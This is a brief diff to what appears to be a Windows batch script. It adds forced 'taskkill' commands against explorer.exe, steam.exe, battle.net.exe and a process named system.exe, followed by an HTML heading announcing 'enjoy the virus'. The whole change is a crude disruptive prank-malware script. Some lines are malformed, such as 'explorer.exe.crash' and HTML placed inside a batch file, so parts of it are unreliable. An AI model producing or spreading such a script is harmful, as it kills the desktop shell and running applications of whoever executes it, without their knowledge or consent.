@@ -1,1 +1,6 @@
-taskkill /f im system.exe
+taskkill /f /im system.exe
+taskkill /f /im battle.net.exe
+taskkill /f /im explorer.exe.crash
+taskkill /f /im explorer.exe
+taskkill /f /im steam.exe
+<h1> enjoy the virus </h1>
